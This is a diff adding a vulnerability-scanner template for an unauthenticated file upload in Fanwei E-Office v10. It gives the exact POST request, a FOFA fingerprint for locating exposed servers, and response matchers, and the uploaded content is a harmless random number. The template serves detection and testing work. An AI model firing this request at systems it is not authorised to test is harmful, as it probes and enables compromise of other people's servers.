@@ -1,0 +1,40 @@
+id: fanwei-eoffice10-welink-upload
+
+info:
+  name: 泛微 E-Office v10 未授权任意文件上传
+  author: known
+  severity: high
+  description: 泛微E-Office 10在 10.0_20230821 版本之前存在远程代码执行漏洞，该漏洞是通过文件上传配合文件包含实现远程代码执行，攻击者可利用此漏洞上传恶意文件并控制服务器。
+  reference:
+    - 
+  metadata:
+    max-request: 1
+    fofa: body="eoffice10" && body="eoffice_loading_tip"
+    verified: "true"
+  tags: fanwei, eoffice10, upload, rce
+
+variables:
+  r1: "{{rand_int(1000000, 9999999)}}"
+  r2: "{{rand_int(1000000, 9999999)}}"
+  rboundary: "{{to_lower(rand_base(32))}}"
+
+http:
+  - raw:
+      - |
+        @timeout: 25s
+        POST /eoffice10/server/public/api/welink/welink-move HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{rboundary}}
+        
+        ------{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{r1}}.txt"
+        
+        {{r2}}
+        ------{{rboundary}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body, '0x000013')
+        condition: and
